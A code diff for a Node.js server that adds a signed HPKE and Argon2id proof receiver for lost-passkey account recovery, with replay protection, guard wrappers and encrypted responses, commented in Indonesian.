-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 function diracCentralCurrentContextPassedV146() {
   const ctx = diracCentralCurrentContextV149();
   return Boolean(ctx && ctx.req && ctx.req.__diracCentralSecurityGuardPassedV146);
+}
+
+/* ============================================================
+   LOST PASSKEY HPKE PROOF RECEIVER v159 - APPEND ONLY
+   - Server 2 menjalankan HPKE dan Argon2id + salt + pepper.
+   - Server 1 hanya menerima proof bertanda tangan dari Server 2.
+   - Seluruh request wajib melewati Central Guard v146.
+   - Tidak mengubah login, A2F/MFA, payment, email, cookie, atau endpoint lama.
+   ============================================================ */
+
+const DIRAC_RECOVERY_HPKE_ACTION_V159 = 'customer_security_recovery_hpke_submit';
+const DIRAC_RECOVERY_HPKE_PROOF_VERSION_V159 = 'dirac-recovery-hpke-proof-v2';
+const DIRAC_RECOVERY_HPKE_SUITE_V159 = 'DHKEM-X25519-HKDF-SHA256+HKDF-SHA384+AES-256-GCM';
+const DIRAC_RECOVERY_HPKE_ARGON2_PROFILE_V159 = 'argon2id-salt-pepper-v1';
+const DIRAC_RECOVERY_HPKE_S2S_CALLER_BINDING_PATCH_V226 = 'dirac-recovery-hpke-s2s-caller-binding-v226';
+
+function diracRecoveryHpkeAssertS2SCallerBindingV226() {
+  const expectedServerId = diracS2SIdV206(process.env.DIRAC_RECOVERY_WORKER_SERVER_ID);
+  const configuredCaller = diracRecoveryHpkeAsciiTokenV159(process.env.DIRAC_RECOVERY_HPKE_ALLOWED_CALLER);
+  if (!expectedServerId || !configuredCaller || !safeEqual(configuredCaller, expectedServerId)) {
+    throw new Error('DIRAC_RECOVERY_HPKE_S2S_CALLER_BINDING_INVALID_V226');
+  }
+  return true;
+}
+
+if (process.env.NODE_ENV === 'production') diracRecoveryHpkeAssertS2SCallerBindingV226();
+const DIRAC_RECOVERY_HPKE_PROOF_REPLAY_V159 = globalThis.__DIRAC_RECOVERY_HPKE_PROOF_REPLAY_V159__ || new Map();
+globalThis.__DIRAC_RECOVERY_HPKE_PROOF_REPLAY_V159__ = DIRAC_RECOVERY_HPKE_PROOF_REPLAY_V159;
+
+CUSTOMER_SECURITY_GUARDED_ACTIONS.add(DIRAC_RECOVERY_HPKE_ACTION_V159);
+DIRAC_CENTRAL_ACTIVE_ACTIONS_V146.add(DIRAC_RECOVERY_HPKE_ACTION_V159);
+DIRAC_CENTRAL_KNOWN_ACTION_INPUTS_V146.add(DIRAC_RECOVERY_HPKE_ACTION_V159);
+DIRAC_CENTRAL_SERVER_ACTIONS_V146.add(DIRAC_RECOVERY_HPKE_ACTION_V159);
+
+const __diracRecoveryHpkePreviousV137ServerOnlyActionV159 = diracV137CsrfServerOnlyAction;
+diracV137CsrfServerOnlyAction = function diracV137CsrfServerOnlyActionRecoveryHpkeV159(action) {
+  const clean = diracV137CsrfNormalizeAction(action);
+  if (clean === DIRAC_RECOVERY_HPKE_ACTION_V159) return true;
+  return __diracRecoveryHpkePreviousV137ServerOnlyActionV159(action);
+};
+Object.defineProperty(diracV137CsrfServerOnlyAction, '__diracRecoveryHpkeProofV159', { value: true, enumerable: false });
+
+const __diracRecoveryHpkePreviousExternalServerActionV159 = diracV138CsrfExternalServerToServerAction;
+diracV138CsrfExternalServerToServerAction = function diracV138CsrfExternalServerToServerActionRecoveryHpkeV159(action) {
+  const clean = diracV138CsrfNormalizeAction(action);
+  if (clean === DIRAC_RECOVERY_HPKE_ACTION_V159) return true;
+  return __diracRecoveryHpkePreviousExternalServerActionV159(action);
+};
+Object.defineProperty(diracV138CsrfExternalServerToServerAction, '__diracRecoveryHpkeProofV159', { value: true, enumerable: false });
+
+const __diracRecoveryHpkePreviousSensitiveKeyV159 = diracCentralSensitiveKeyV146;
+diracCentralSensitiveKeyV146 = function diracCentralSensitiveKeyRecoveryHpkeV159(key) {
+  if (/^(argon2_proof|proof_nonce|verification_context_hash)$/i.test(String(key || ''))) return true;
+  return __diracRecoveryHpkePreviousSensitiveKeyV159(key);
+};
+Object.defineProperty(diracCentralSensitiveKeyV146, '__diracRecoveryHpkeProofV159', { value: true, enumerable: false });
+
+const __diracRecoveryHpkePreviousContractV159 = diracCentralContractForActionV146;
+diracCentralContractForActionV146 = function diracCentralContractForActionRecoveryHpkeV159(action) {
+  if (String(action || '') === DIRAC_RECOVERY_HPKE_ACTION_V159) {
+    return {
+      methods: ['POST'],
+      allowed: [
+        'action',
+        'version',
+        'request_id',
+        'proof_nonce',
+        'verified_at_ms',
+        'proof_expires_at_ms',
+        'hpke_suite',
+        'hpke_key_id',
+        'argon2_profile',
+        'argon2_proof',
+        'verification_context_hash'
+      ],
+      required: [
+        'action',
+        'version',
+        'request_id',
+        'proof_nonce',
+        'verified_at_ms',
+        'proof_expires_at_ms',
+        'hpke_suite',
+        'hpke_key_id',
+        'argon2_profile',
+        'argon2_proof',
+        'verification_context_hash'
+      ],
+      maxBodyBytes: 8 * 1024,
+      maxFieldBytes: 2048,
+      mutation: true,
+      allowProtectedFields: false
+    };
+  }
+  return __diracRecoveryHpkePreviousContractV159(action);
+};
+Object.defineProperty(diracCentralContractForActionV146, '__diracRecoveryHpkeProofV159', { value: true, enumerable: false });
+
+const __diracRecoveryHpkePreviousDistributedNeedV159 = diracCentralNeedsDistributedRateLimitV146;
+diracCentralNeedsDistributedRateLimitV146 = function diracCentralNeedsDistributedRateLimitRecoveryHpkeV159(action) {
+  if (String(action || '') === DIRAC_RECOVERY_HPKE_ACTION_V159) return true;
+  return __diracRecoveryHpkePreviousDistributedNeedV159(action);
+};
+Object.defineProperty(diracCentralNeedsDistributedRateLimitV146, '__diracRecoveryHpkeProofV159', { value: true, enumerable: false });
+
+const __diracRecoveryHpkePreviousDistributedMaxV159 = diracCentralDistributedRateLimitMaxV146;
+diracCentralDistributedRateLimitMaxV146 = function diracCentralDistributedRateLimitMaxRecoveryHpkeV159(action) {
+  if (String(action || '') === DIRAC_RECOVERY_HPKE_ACTION_V159) return 8;
+  return __diracRecoveryHpkePreviousDistributedMaxV159(action);
+};
+Object.defineProperty(diracCentralDistributedRateLimitMaxV146, '__diracRecoveryHpkeProofV159', { value: true, enumerable: false });
+
+const __diracRecoveryHpkePreviousServerGuardV159 = diracCentralServerToServerGuardV146;
+diracCentralServerToServerGuardV146 = async function diracCentralServerToServerGuardRecoveryHpkeV159(req, res, ctx) {
+  const previous = await __diracRecoveryHpkePreviousServerGuardV159(req, res, ctx);
+  if (!previous || previous.ok !== true || !ctx || ctx.action !== DIRAC_RECOVERY_HPKE_ACTION_V159) return previous;
+  return diracRecoveryHpkeProofSignatureGuardV159(req, ctx);
+};
+Object.defineProperty(diracCentralServerToServerGuardV146, '__diracRecoveryHpkeProofV159', { value: true, enumerable: false });
+
+const __diracRecoveryHpkePreviousDeviceCredentialGuardV159 =
+  diracCentralDeviceCredentialGuardV221;
+
+diracCentralDeviceCredentialGuardV221 =
+  async function diracCentralDeviceCredentialGuardRecoveryHpkeV159(req, res, ctx) {
+    if (!ctx || ctx.action !== DIRAC_RECOVERY_HPKE_ACTION_V159) {
+      return __diracRecoveryHpkePreviousDeviceCredentialGuardV159(req, res, ctx);
+    }
+
+    if (
+      ctx.method !== 'POST'
+      || ctx.classification !== 'server'
+      || ctx.authentication !== 'server'
+      || !DIRAC_CENTRAL_SERVER_ACTIONS_V146.has(ctx.action)
+      || ctx.__diracS2SSevenSignaturesVerifiedV206 !== true
+      || !req
+      || req.__diracRecoveryHpkeProofVerifiedV159 !== true
+    ) {
+      return {
+        ok: false,
+        reason: 'recovery_hpke_verified_s2s_device_binding_required'
+      };
+    }
+
+    return {
+      ok: true,
+      decision: 'verified_s2s_hpke_device_binding_not_applicable'
+    };
+  };
+
+Object.defineProperty(
+  diracCentralDeviceCredentialGuardV221,
+  '__diracRecoveryHpkeProofV159',
+  { value: true, enumerable: false }
+);
+
+const __diracRecoveryHpkePreviousIdorGuardV159 = diracCentralIdorBolaGuardV146;
+diracCentralIdorBolaGuardV146 = async function diracCentralIdorBolaGuardRecoveryHpkeV159(req, ctx) {
+  if (!ctx || ctx.action !== DIRAC_RECOVERY_HPKE_ACTION_V159) {
+    return __diracRecoveryHpkePreviousIdorGuardV159(req, ctx);
+  }
+  if (!req || req.__diracRecoveryHpkeProofVerifiedV159 !== true) {
+    return { ok: false, reason: 'recovery_hpke_proof_signature_required' };
+  }
+  const requestId = customerSecurityNormalizeLostPasskeyRequestId(ctx.body && ctx.body.request_id);
+  if (!requestId) return { ok: false, reason: 'recovery_hpke_request_id_invalid' };
+  const result = await diracRecoveryHpkeReadRequestV159(requestId).catch(() => null);
+  if (!result || !result.ok) return { ok: false, reason: 'recovery_hpke_request_storage_unavailable' };
+  const row = result.row;
+  const expiresAtMs = Date.parse(row && row.expires_at || '');
+  if (!row || !row.id || row.status !== 'pending' || row.used_at || row.revoked_at || row.locked_at
+    || !Number.isFinite(expiresAtMs) || expiresAtMs <= Date.now()) {
+    return { ok: false, reason: 'recovery_hpke_request_inactive' };
+  }
+  ctx.__diracRecoveryHpkeRequestRowV159 = row;
+  return { ok: true, guarded: 'signed_hpke_proof_active_request' };
+};
+Object.defineProperty(diracCentralIdorBolaGuardV146, '__diracRecoveryHpkeProofV159', { value: true, enumerable: false });
+
+const __diracRecoveryHpkePreviousPasskeyServiceRoleV159 = diracCentralIsPasskeyServiceRoleV146;
+diracCentralIsPasskeyServiceRoleV146 = function diracCentralIsPasskeyServiceRoleRecoveryHpkeV159(ctx, table, path, options, method) {
+  if (ctx && ctx.action === DIRAC_RECOVERY_HPKE_ACTION_V159) {
+    return __diracRecoveryHpkePreviousPasskeyServiceRoleV159(
+      { ...ctx, action: DIRAC_RECOVERY_WORKER_ACTION },
+      table,
+      path,
+      options,
+      method
+    );
+  }
+  return __diracRecoveryHpkePreviousPasskeyServiceRoleV159(ctx, table, path, options, method);
+};
+Object.defineProperty(diracCentralIsPasskeyServiceRoleV146, '__diracRecoveryHpkeProofV159', { value: true, enumerable: false });
+
+const __diracRecoveryHpkePreviousGuardedHandlerV159 = customerSecurityHandleGuardedAction;
+customerSecurityHandleGuardedAction = async function customerSecurityHandleGuardedActionRecoveryHpkeV159(action, req, res) {
+  if (String(action || '') === DIRAC_RECOVERY_HPKE_ACTION_V159) {
+    return diracRecoveryHpkeCommitProofV159(req, res);
+  }
+  return __diracRecoveryHpkePreviousGuardedHandlerV159(action, req, res);
+};
+Object.defineProperty(customerSecurityHandleGuardedAction, '__diracRecoveryHpkeProofV159', { value: true, enumerable: false });
+
+function diracRecoveryHpkeHeaderV159(req, name) {
+  return String(req && req.headers && req.headers[String(name || '').toLowerCase()] || '').trim();
+}
+
+function diracRecoveryHpkeAsciiTokenV159(value, minLength = 1, maxLength = 80) {
+  const clean = String(value || '').trim();
+  if (clean.length < minLength || clean.length > maxLength) return '';
+  return /^[A-Za-z0-9_.-]+$/.test(clean) ? clean : '';
+}
+
+function diracRecoveryHpkeBase64UrlV159(value, minLength, maxLength) {
+  const clean = String(value || '').trim();
+  if (clean.length < minLength || clean.length > maxLength) return '';
+  return /^[A-Za-z0-9_-]+$/.test(clean) ? clean : '';
+}
+
+function diracRecoveryHpkeServer2OnlyEnvOnServer1V159() {
+  const names = [
+    'DIRAC_RECOVERY_HPKE_PRIVATE_KEY',
+    'DIRAC_RECOVERY_HPKE_KEY_ID',
+    'DIRAC_RECOVERY_HPKE_PEPPER',
+    'DIRAC_RECOVERY_HPKE_PEPPER_KEY_ID',
+    'DIRAC_RECOVERY_HPKE_ARGON2_MEMORY_KIB',
+    'DIRAC_RECOVERY_HPKE_ARGON2_TIME_COST',
+    'DIRAC_LOST_PASSKEY_ARGON2_MEMORY_KIB',
+    'DIRAC_LOST_PASSKEY_ARGON2_TIME_COST'
+  ];
+  return names.filter((name) => String(process.env[name] || '').trim() !== '');
+}
+
+function diracRecoveryHpkeProofSignatureV159(caller, timestampText, body) {
+  const secretText = customerSecurityRecoveryWorkerSecret();
+  if (!secretText) return '';
+  const secret = Buffer.from(secretText, 'utf8');
+  try {
+    return crypto.createHmac('sha384', secret)
+      .update('dirac-recovery-hpke-proof-v159')
+      .update('\n')
+      .update(String(caller || ''))
+      .update('\n')
+      .update(String(timestampText || ''))
+      .update('\n')
+      .update(customerSecurityLostPasskeyCanonical(body || {}))
+      .digest('base64url');
+  } finally {
+    secret.fill(0);
+  }
+}
+
+const DIRAC_RECOVERY_HPKE_PROOF_RESPONSE_VERSION_V190 = 'dirac-recovery-hpke-proof-response-v191';
+
+function diracRecoveryHpkeProofResponseKeyV190(body) {
+  const secretText = customerSecurityRecoveryWorkerSecret();
+  if (!secretText) throw new Error('RECOVERY_HPKE_PROOF_RESPONSE_SECRET_MISSING');
+  const secret = Buffer.from(secretText, 'utf8');
+  const salt = crypto.createHash('sha512').update(customerSecurityLostPasskeyCanonical(body || {})).digest();
+  const info = Buffer.from([
+    'dirac/recovery-hpke/v190/proof-response',
+    String(body && body.request_id || ''),
+    String(body && body.proof_nonce || '')
+  ].join('\n'), 'utf8');
+  try {
+    return Buffer.from(crypto.hkdfSync('sha512', secret, salt, info, 32));
+  } finally {
+    secret.fill(0);
+    salt.fill(0);
+    info.fill(0);
+  }
+}
+
+function diracRecoveryHpkeProofResponseAadV190(body, status) {
+  return {
+    version: DIRAC_RECOVERY_HPKE_PROOF_RESPONSE_VERSION_V190,
+    status: Number(status),
+    request_id: String(body && body.request_id || ''),
+    proof_nonce: String(body && body.proof_nonce || '')
+  };
+}
+
+function diracRecoveryHpkeEncryptProofResponseV190(body, status, payload) {
+  const key = diracRecoveryHpkeProofResponseKeyV190(body);
+  const plaintext = Buffer.from(customerSecurityLostPasskeyCanonical(payload), 'utf8');
+  const nonce = crypto.randomBytes(12);
+  const aadObject = diracRecoveryHpkeProofResponseAadV190(body, status);
+  const aad = Buffer.from(customerSecurityLostPasskeyCanonical(aadObject), 'utf8');
+  try {
+    const cipher = crypto.createCipheriv('aes-256-gcm', key, nonce, { authTagLength: 16 });
+    cipher.setAAD(aad, { plaintextLength: plaintext.length });
+    const ciphertext = Buffer.concat([cipher.update(plaintext), cipher.final()]);
+    const tag = cipher.getAuthTag();
+    const response = {
+      version: DIRAC_RECOVERY_HPKE_PROOF_RESPONSE_VERSION_V190,
+      status: Number(status),
+      request_id: String(body && body.request_id || ''),
+      proof_nonce: String(body && body.proof_nonce || ''),
+      nonce_b64url: nonce.toString('base64url'),
+      ciphertext_b64url: ciphertext.toString('base64url'),
+      auth_tag_b64url: tag.toString('base64url')
+    };
+    Object.defineProperty(response, 'version', {
+      value: 'dirac-recovery-hpke-proof-response-v191',
+      enumerable: true,
+      writable: false,
+      configurable: false
+    });
+    Object.defineProperty(response, DIRAC_ULTRA_RECOVERY_HPKE_RESPONSE_MARKER_V191, {
+      value: true,
+      enumerable: false,
+      writable: false,
+      configurable: false
+    });
+    ciphertext.fill(0);
+    tag.fill(0);
+    return { ok: true, proof_response_encrypted: true, proof_response: response };
+  } finally {
+    key.fill(0);
+    plaintext.fill(0);
+    nonce.fill(0);
+    aad.fill(0);
+  }
+}
+
+function diracRecoveryHpkeProofSignatureGuardV159(req, ctx) {
+  if (diracRecoveryHpkeServer2OnlyEnvOnServer1V159().length) {
+    return { ok: false, reason: 'recovery_hpke_server2_env_present_on_server1' };
+  }
+  const contentType = diracRecoveryHpkeHeaderV159(req, 'content-type').toLowerCase();
+  if (!contentType.startsWith('application/json')) return { ok: false, reason: 'recovery_hpke_content_type_invalid' };
+
+  const caller = diracRecoveryHpkeAsciiTokenV159(diracRecoveryHpkeHeaderV159(req, 'x-dirac-hpke-caller'));
+  const signedServerId = diracS2SIdV206(diracRecoveryHpkeHeaderV159(req, 'x-dirac-server-id'));
+  const expectedServerId = diracS2SIdV206(process.env.DIRAC_RECOVERY_WORKER_SERVER_ID);
+  const configuredCaller = diracRecoveryHpkeAsciiTokenV159(process.env.DIRAC_RECOVERY_HPKE_ALLOWED_CALLER);
+  if (!ctx
+      || ctx.__diracS2SSevenSignaturesVerifiedV206 !== true
+      || !caller
+      || !signedServerId
+      || !expectedServerId
+      || !configuredCaller
+      || !safeEqual(signedServerId, expectedServerId)
+      || !safeEqual(caller, signedServerId)
+      || !safeEqual(configuredCaller, signedServerId)) {
+    return { ok: false, reason: 'recovery_hpke_caller_invalid' };
+  }
+
+  const timestampText = diracRecoveryHpkeHeaderV159(req, 'x-dirac-hpke-timestamp');
+  const timestamp = Number(timestampText);
+  if (!Number.isSafeInteger(timestamp) || timestamp <= 0 || Math.abs(Date.now() - timestamp) > 120 * 1000) {
+    return { ok: false, reason: 'recovery_hpke_timestamp_invalid' };
+  }
+
+  const signature = diracRecoveryHpkeHeaderV159(req, 'x-dirac-hpke-signature');
+  if (!/^[A-Za-z0-9_-]{64}$/.test(signature)) return { ok: false, reason: 'recovery_hpke_signature_missing' };
+
+  const body = ctx && ctx.body && typeof ctx.body === 'object' && !Array.isArray(ctx.body) ? ctx.body : null;
+  if (!body || body.action !== DIRAC_RECOVERY_HPKE_ACTION_V159 || body.version !== DIRAC_RECOVERY_HPKE_PROOF_VERSION_V159) {
+    return { ok: false, reason: 'recovery_hpke_body_binding_invalid' };
+  }
+
+  const expected = diracRecoveryHpkeProofSignatureV159(caller, timestampText, body);
+  if (!expected || !safeEqual(signature, expected)) return { ok: false, reason: 'recovery_hpke_signature_invalid' };
+
+  req.__diracRecoveryHpkeProofVerifiedV159 = true;
+  return { ok: true };
+}
+
+function diracRecoveryHpkeValidateProofV159(body) {
+  const source = body && typeof body === 'object' && !Array.isArray(body) ? body : {};
+  const requestId = customerSecurityNormalizeLostPasskeyRequestId(source.request_id);
+  const proofNonce = diracRecoveryHpkeBase64UrlV159(source.proof_nonce, 32, 120);
+  const hpkeKeyId = diracRecoveryHpkeAsciiTokenV159(source.hpke_key_id, 1, 80);
+  const argon2Proof = diracRecoveryHpkeBase64UrlV159(source.argon2_proof, 64, 192);
+  const contextHash = diracRecoveryHpkeBase64UrlV159(source.verification_context_hash, 64, 64);
+  const verifiedAtMs = Number(source.verified_at_ms);
+  const proofExpiresAtMs = Number(source.proof_expires_at_ms);
+  const now = Date.now();
+
+  if (source.action !== DIRAC_RECOVERY_HPKE_ACTION_V159) return { ok: false };
+  if (source.version !== DIRAC_RECOVERY_HPKE_PROOF_VERSION_V159) return { ok: false };
+  if (source.hpke_suite !== DIRAC_RECOVERY_HPKE_SUITE_V159) return { ok: false };
+  if (source.argon2_profile !== DIRAC_RECOVERY_HPKE_ARGON2_PROFILE_V159) return { ok: false };
+  if (!requestId || !proofNonce || !hpkeKeyId || !argon2Proof || !contextHash) return { ok: false };
+  if (!Number.isSafeInteger(verifiedAtMs) || !Number.isSafeInteger(proofExpiresAtMs)) return { ok: false };
+  if (verifiedAtMs > now + 30 * 1000 || now - verifiedAtMs > 2 * 60 * 1000) return { ok: false };
+  if (proofExpiresAtMs <= now || proofExpiresAtMs <= verifiedAtMs || proofExpiresAtMs - verifiedAtMs > 2 * 60 * 1000) return { ok: false };
+
+  return { ok: true, requestId, proofNonce, hpkeKeyId, argon2Proof, contextHash, verifiedAtMs, proofExpiresAtMs };
+}
+
+async function diracRecoveryHpkeReadRequestV159(requestId) {
+  const fields = 'id,request_id,customer_id,auth_user_id,salt,status,attempt_count,expires_at,used_at,revoked_at,locked_at,old_passkey_ids,metadata';
+  const path = '/rest/v1/' + LOST_PASSKEY_RECOVERY_REQUEST_TABLE
+    + '?select=' + encodeURIComponent(fields)
+    + '&request_id=eq.' + encodeURIComponent(requestId)
+    + '&limit=1';
+  const result = await supabaseFetch(path, { method: 'GET', auth: 'service' });
+  return {
+    ok: Boolean(result && result.ok),
+    status: result && result.status,
+    row: result && result.ok && Array.isArray(result.data) ? result.data[0] || null : null
+  };
+}
+
+function diracRecoveryHpkeContextHashV159(validated, row) {
+  const context = {
+    action: DIRAC_RECOVERY_HPKE_ACTION_V159,
+    version: DIRAC_RECOVERY_HPKE_PROOF_VERSION_V159,
+    request_id: validated.requestId,
+    customer_id: String(row && row.customer_id || ''),
+    auth_user_id: String(row && row.auth_user_id || ''),
+    request_salt_hash: crypto.createHash('sha384').update(String(row && row.salt || '')).digest('base64url'),
+    hpke_suite: DIRAC_RECOVERY_HPKE_SUITE_V159,
+    hpke_key_id: validated.hpkeKeyId,
+    argon2_profile: DIRAC_RECOVERY_HPKE_ARGON2_PROFILE_V159,
+    verified_at_ms: validated.verifiedAtMs,
+    proof_expires_at_ms: validated.proofExpiresAtMs
+  };
+  return crypto.createHash('sha384')
+    .update(customerSecurityLostPasskeyCanonical(context))
+    .digest('base64url');
+}
+
+function diracRecoveryHpkeReplayKeyV159(validated) {
+  return crypto.createHash('sha384')
+    .update([validated.requestId, validated.proofNonce, validated.contextHash].join('|'))
+    .digest('base64url');
+}
+
+function diracRecoveryHpkeClaimProofV159(validated) {
+  const now = Date.now();
+  for (const [key, value] of DIRAC_RECOVERY_HPKE_PROOF_REPLAY_V159.entries()) {
+    if (Number(value && value.expiresAtMs || 0) <= now) DIRAC_RECOVERY_HPKE_PROOF_REPLAY_V159.delete(key);
+  }
+  const key = diracRecoveryHpkeReplayKeyV159(validated);
+  if (DIRAC_RECOVERY_HPKE_PROOF_REPLAY_V159.has(key)) return { ok: false };
+  DIRAC_RECOVERY_HPKE_PROOF_REPLAY_V159.set(key, { state: 'processing', expiresAtMs: now + 10 * 60 * 1000 });
+  if (DIRAC_RECOVERY_HPKE_PROOF_REPLAY_V159.size > 5000) {
+    for (const oldKey of DIRAC_RECOVERY_HPKE_PROOF_REPLAY_V159.keys()) {
+      DIRAC_RECOVERY_HPKE_PROOF_REPLAY_V159.delete(oldKey);
+      if (DIRAC_RECOVERY_HPKE_PROOF_REPLAY_V159.size <= 3000) break;
+    }
+  }
+  return { ok: true, key };
+}
+
+function diracRecoveryHpkeReleaseProofV159(claim) {
+  if (claim && claim.key) DIRAC_RECOVERY_HPKE_PROOF_REPLAY_V159.delete(claim.key);
+}
+
+function diracRecoveryHpkeConsumeProofV159(claim) {
+  if (!claim || !claim.key) return;
+  DIRAC_RECOVERY_HPKE_PROOF_REPLAY_V159.set(claim.key, {
+    state: 'consumed',
+    expiresAtMs: Date.now() + 30 * 60 * 1000
+  });
+}
+
+async function diracRecoveryHpkeRollbackRequestV159(requestId, metadata) {
+  await supabaseFetch('/rest/v1/' + LOST_PASSKEY_RECOVERY_REQUEST_TABLE
+    + '?request_id=eq.' + encodeURIComponent(requestId)
+    + '&status=eq.verified', {
+    method: 'PATCH',
+    auth: 'service',
+    body: { status: 'pending', metadata: metadata || {} }
+  }).catch(() => null);
+}
+
+async function diracRecoveryHpkeCommitProofV159(req, res) {
+  if (req.method !== 'POST') return res.status(405).json({ ok: false, message: 'Gunakan POST.' });
+  if (req.__diracCentralSecurityGuardPassedV146 !== true || !diracCentralCurrentContextPassedV146()) {
+    return res.status(403).json({ ok: false, code: 'CENTRAL_GUARD_REQUIRED', message: 'Permintaan ditolak oleh sistem keamanan.' });
+  }
+  if (req.__diracRecoveryHpkeProofVerifiedV159 !== true) {
+    return res.status(403).json({ ok: false, code: 'RECOVERY_HPKE_PROOF_SIGNATURE_REQUIRED', message: 'Bukti recovery tidak valid.' });
+  }
+
+  const ctx = diracCentralCurrentContextV149();
+  const body = ctx && ctx.body && typeof ctx.body === 'object' ? ctx.body : null;
+  const validated = diracRecoveryHpkeValidateProofV159(body);
+  const row = ctx && ctx.__diracRecoveryHpkeRequestRowV159;
+  if (!validated.ok || !row || !row.id) {
+    return res.status(400).json({ ok: false, code: 'RECOVERY_HPKE_PROOF_INVALID', message: 'Bukti recovery tidak valid.' });
+  }
+  if (!customerSecurityLooksLikeUuid(row.customer_id) || !customerSecurityLooksLikeUuid(row.auth_user_id)) {
+    return res.status(403).json({ ok: false, code: 'RECOVERY_REQUEST_OWNER_INVALID', message: 'Pemilik recovery request tidak valid.' });
+  }
+  if (!Array.isArray(row.old_passkey_ids) || row.old_passkey_ids.length < 1) {
+    return res.status(409).json({ ok: false, code: 'ACTIVE_PASSKEY_NOT_FOUND', message: 'Passkey lama tidak ditemukan.' });
+  }
+
+  const expectedContextHash = diracRecoveryHpkeContextHashV159(validated, row);
+  if (!safeEqual(validated.contextHash, expectedContextHash)) {
+    return res.status(403).json({ ok: false, code: 'RECOVERY_HPKE_CONTEXT_MISMATCH', message: 'Konteks bukti recovery tidak cocok.' });
+  }
+
+  const claim = diracRecoveryHpkeClaimProofV159(validated);
+  if (!claim.ok) {
+    return res.status(409).json({ ok: false, code: 'RECOVERY_HPKE_PROOF_REPLAYED', message: 'Bukti recovery sudah pernah dipakai.' });
+  }
+
+  const now = diracNowIso();
+  const previousMetadata = row.metadata && typeof row.metadata === 'object' && !Array.isArray(row.metadata) ? row.metadata : {};
+  const proofMetadata = {
+    source: DIRAC_RECOVERY_HPKE_ACTION_V159,
+    verification_source: 'vercel2_signed_hpke_argon2id_proof_v159',
+    hpke_suite: DIRAC_RECOVERY_HPKE_SUITE_V159,
+    hpke_key_id: validated.hpkeKeyId,
+    argon2_profile: DIRAC_RECOVERY_HPKE_ARGON2_PROFILE_V159,
+    argon2_proof_hash: crypto.createHash('sha384').update(validated.argon2Proof).digest('base64url'),
+    verification_context_hash: validated.contextHash,
+    proof_nonce_hash: crypto.createHash('sha384').update(validated.proofNonce).digest('base64url'),
+    proof_verified_at_ms: validated.verifiedAtMs,
+    proof_expires_at_ms: validated.proofExpiresAtMs,
+    old_passkey_count: row.old_passkey_ids.length,
+    plaintext_recovery_code_received: false
+  };
+
+  let requestCommitted = false;
+  try {
+    const requestPatched = await supabaseFetch('/rest/v1/' + LOST_PASSKEY_RECOVERY_REQUEST_TABLE
+      + '?request_id=eq.' + encodeURIComponent(validated.requestId)
+      + '&status=eq.pending', {
+      method: 'PATCH',
+      auth: 'service',
+      prefer: 'return=representation',
+      body: {
+        status: 'verified',
+        metadata: { ...previousMetadata, ...proofMetadata, verified_at: now }
+      }
+    });
+
+    if (!requestPatched.ok || !Array.isArray(requestPatched.data) || requestPatched.data.length !== 1) {
+      return res.status(409).json({ ok: false, code: 'RECOVERY_REQUEST_COMMIT_CONFLICT', message: 'Recovery request sudah diproses.' });
+    }
+    requestCommitted = true;
+
+    const recoverySession = crypto.randomBytes(32).toString('base64url');
+    const recoverySessionHash = customerSecurityLostPasskeyRecoverySessionHash(recoverySession);
+    const sessionExpiresAt = new Date(Date.now() + Math.max(5, Math.min(30, Number(process.env.DIRAC_LOST_PASSKEY_SESSION_MINUTES || 10))) * 60 * 1000).toISOString();
+    const sessionCreated = await supabaseFetch('/rest/v1/' + LOST_PASSKEY_RECOVERY_SESSION_TABLE, {
+      method: 'POST',
+      auth: 'service',
+      prefer: 'return=representation',
+      body: [{
+        request_id: validated.requestId,
+        customer_id: row.customer_id,
+        auth_user_id: row.auth_user_id,
+        recovery_session_hash: recoverySessionHash,
+        purpose: LOST_PASSKEY_RECOVERY_PURPOSE,
+        status: 'verified',
+        created_at: now,
+        expires_at: sessionExpiresAt,
+        metadata: proofMetadata
+      }]
+    });
+
+    if (!sessionCreated.ok) {
+      await diracRecoveryHpkeRollbackRequestV159(validated.requestId, previousMetadata);
+      requestCommitted = false;
+      return res.status(sessionCreated.status || 500).json({ ok: false, code: 'RECOVERY_SESSION_CREATE_FAILED', message: 'Recovery session belum dapat dibuat.' });
+    }
+
+    diracRecoveryHpkeConsumeProofV159(claim);
+    await customerSecurityWriteGuardEvent(row.customer_id, {
+      event_type: 'lost_passkey_recovery_hpke_verified',
+      status: 'success',
+      risk_level: 'high',
+      description: 'Server 1 menerima proof HPKE dan Argon2id bertanda tangan dari Vercel 2 tanpa recovery code plaintext.',
+      req,
+      metadata: {
+        action: DIRAC_RECOVERY_HPKE_ACTION_V159,
+        request_id: validated.requestId,
+        hpke_key_id: validated.hpkeKeyId,
+        plaintext_recovery_code_received: false
+      }
+    }).catch(() => null);
+
+    const successPayload = {
+      ok: true,
+      active: true,
+      method: 'hpke_argon2id_proof',
+      purpose: LOST_PASSKEY_RECOVERY_PURPOSE,
+      message: 'Kode pemulihan berhasil diverifikasi secara aman. Silakan lanjutkan tombol Verify.',
+      dirac_lost_passkey_recovery_session: recoverySession,
+      recovery_session_expires_at: sessionExpiresAt,
+      dashboard_access: false,
+      recovery_code_verified: true,
+      plaintext_recovery_code_received: false,
+      hpke_suite: DIRAC_RECOVERY_HPKE_SUITE_V159,
+      time: now
+    };
+    return res.status(200).json(diracRecoveryHpkeEncryptProofResponseV190(body, 200, successPayload));
+  } catch (error) {
+    if (requestCommitted) await diracRecoveryHpkeRollbackRequestV159(validated.requestId, previousMetadata);
+    return res.status(500).json({ ok: false, code: 'RECOVERY_HPKE_COMMIT_FAILED', message: 'Recovery proof belum dapat diproses.' });
+  } finally {
+    if (!requestCommitted) diracRecoveryHpkeReleaseProofV159(claim);
+  }
+}
+
+const __diracFinalCentralGuardExportInvariantV193 = true;
+// Final fail-closed invariant: every exported action must enter the Central Guard wrapper.
+if (typeof module === 'undefined'
+    || typeof __diracV202DispatcherSentinel !== 'function'
+    || __diracV202DispatcherSentinel.__diracCentralSecurityGuardV146 !== true) {
+  throw new Error('DIRAC_FINAL_CENTRAL_GUARD_EXPORT_REQUIRED');
+}
+
+/* ============================================================
+   DIRAC SERVER 1 RECOVERY BOUNDARY HARDENING v201
+   Narrow scope: recovery worker URL, environment partition, and
+   server-to-server request authentication. Business handlers unchanged.
+   ============================================================ */
+
+const DIRAC_SERVER1_RECOVERY_BOUNDARY_V201 = 'dirac-server1-recovery-boundary-v201';
+const DIRAC_RECOVERY_WORKER_AUTH_CONTEXT_V201 = 'dirac-recovery-worker-auth-v201';
